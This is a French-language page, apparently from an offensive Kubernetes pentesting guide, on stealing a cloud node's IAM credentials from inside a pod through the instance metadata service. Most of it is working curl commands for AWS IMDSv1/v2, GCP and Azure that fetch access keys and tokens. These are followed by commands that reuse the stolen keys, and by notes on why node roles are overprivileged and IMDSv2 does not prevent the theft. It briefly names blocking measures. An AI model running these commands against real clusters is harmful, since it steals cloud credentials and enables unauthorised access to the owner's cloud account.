---
title: "Métadonnées cloud depuis un pod : atteindre les identifiants d'instance du nœud"
order: 4
description: "Un pod Kubernetes sur un nœud cloud peut généralement atteindre le service de métadonnées d'instance à 169.254.169.254 à moins qu'il ne soit explicitement bloqué. Ce point de terminaison renvoie les identifiants du rôle IAM du nœud, qui portent généralement bien plus de permissions cloud que le pod ne devrait en avoir, transformant un point d'ancrage dans un pod en accès au compte cloud."
keywords:
  - métadonnées d'instance
  - 169.254.169.254
  - imds
  - rôle iam du nœud
  - identifiants cloud
---

# Métadonnées cloud depuis un pod

Sur un cluster cloud managé, chaque nœud est une machine virtuelle dotée d'un rôle IAM attaché, et le service de métadonnées d'instance cloud expose les identifiants de ce rôle à l'adresse lien-local `169.254.169.254`. À moins que le cluster ne bloque explicitement l'accès des pods à celui-ci (avec une NetworkPolicy, un proxy de métadonnées, ou le contrôle de limite de sauts sur certains clouds), un pod atteint le point de terminaison et lit les identifiants du nœud. Les rôles de nœud sont couramment surprivilégiés, de sorte que cela convertit un point d'ancrage dans un pod en un accès au compte cloud qui éclipse les droits Kubernetes du pod.

```bash
# AWS IMDSv1 (no token) or IMDSv2 (requires a session token first)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
R=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$R   # AccessKeyId/SecretAccessKey/Token
# IMDSv2 handshake if v1 is disabled
TOK=$(curl -s -XPUT http://169.254.169.254/latest/api/token \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOK" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (requires the Metadata-Flavor header)
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

## Utiliser les identifiants

```bash
# AWS: export the returned keys and act as the node role
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws ec2 describe-instances; aws s3 ls                  # scope depends on the node role
```

## Notes d'exploitation

- Le rôle de nœud est généralement plus large que ce dont un pod individuel a besoin (il doit prendre en charge les intégrations kubelet, CNI, volumes et journalisation), de sorte que ses identifiants déverrouillent fréquemment le stockage, d'autres instances, et parfois des actions cloud à l'échelle du cluster.
- IMDSv2 n'ajoute qu'une poignée de main par jeton, pas une authentification ; un pod qui peut atteindre le point de terminaison récupère tout de même des identifiants, de sorte qu'un IMDS accessible constitue une exposition quelle que soit la version.
- Le blocage est l'exception, pas la règle : une NetworkPolicy refusant `169.254.169.254`, un proxy de métadonnées, ou une limite de sauts de 1 le met en échec ; testez l'accessibilité avant de supposer qu'il est bloqué.
- Distinct du rôle de nœud, un pod peut détenir sa propre identité cloud via l'identité de charge de travail ; voir [IAM cloud via l'identité de charge de travail](../lateral-movement/cloud-iam-via-workload-identity.md).

## Références

- [AWS : service de métadonnées d'instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [GCP : serveur de métadonnées de VM](https://cloud.google.com/compute/docs/metadata/overview)
- [HackTricks : cloud metadata SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf)
